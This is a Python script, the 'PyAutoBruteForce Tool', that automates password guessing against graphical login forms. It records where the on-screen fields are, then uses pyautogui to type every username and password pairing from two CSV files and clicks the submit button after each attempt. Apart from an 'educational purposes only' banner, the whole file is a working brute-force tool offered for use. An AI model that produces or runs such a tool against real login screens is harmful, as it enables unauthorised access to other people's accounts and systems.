import pyautogui as auto #type: ignore
from time import sleep
from colorama import init, Fore, Back, Style #type: ignore

# Initialize colorama
init(autoreset=True)

auto.FAILSAFE = True

# Banner definition
def print_banner():
    print(Fore.RED + Back.YELLOW + Style.BRIGHT + "  PyAutoBruteForce Tool  ")
    print(Fore.YELLOW + "Automates brute-forcing passwords for educational purposes only.")
    print(Fore.GREEN + "Please use responsibly!\n")

# Display the banner
print_banner()

action_elements = int(input(Fore.CYAN + "Enter the number of action elements (inputs, buttons, and checkboxes): "))
delay_time_ms = float(input(Fore.CYAN + "Enter the delay duration in milliseconds (e.g., 1000 = 1 second): ")) / 1000

actionElementsPos = {}

def getMousePos():
    sleep(3)
    return auto.position()

def mouseClick(x, y):
    sleep(delay_time_ms)
    auto.leftClick(x, y)

def mousePaste(x, y, text):
    sleep(delay_time_ms)
    auto.click(x, y)
    auto.typewrite(text)

def autoBruteForce():
    with open("usernames.csv", "r") as usernames, open("passwords.csv", "r") as passwords:
        username_list = usernames.read().splitlines()
        password_list = passwords.read().splitlines()
        keys = list(actionElementsPos.keys())

        for user in username_list:
            print(Fore.GREEN + f"Entering username: {user}")
            mousePaste(actionElementsPos[keys[0]]['x'], actionElementsPos[keys[0]]['y'], user)
            for password in password_list:
                print(Fore.GREEN + f"Entering password: {password}")
                mousePaste(actionElementsPos[keys[1]]['x'], actionElementsPos[keys[1]]['y'], password)
                if len(keys) > 2 and keys[2] in actionElementsPos and actionElementsPos[keys[2]]['actionType'] == 2:
                    print(Fore.RED + "Clicking the button...")
                    mouseClick(actionElementsPos[keys[2]]['x'], actionElementsPos[keys[2]]['y'])


def main():
    for actionField in range(action_elements):
        actionFieldName = input(Fore.CYAN + f"Enter a name for action element {actionField + 1}: ")

        while True:
            actionType = int(input(Fore.CYAN + "Enter 1 for Input or 2 for Button: "))
            if actionType in [1, 2]:
                break
            print(Fore.RED + "Invalid input. Please enter 1 or 2.")

        print(Fore.YELLOW + f"Place mouse pointer at {actionFieldName}")

        x, y = getMousePos()
        actionElementsPos[actionFieldName] = {
            "actionType": actionType,
            "x": x,
            "y": y
        }

        print(Fore.GREEN + f"{actionFieldName} position: x={x} y={y}")

    autoBruteForce()

if __name__ == "__main__":
    main()
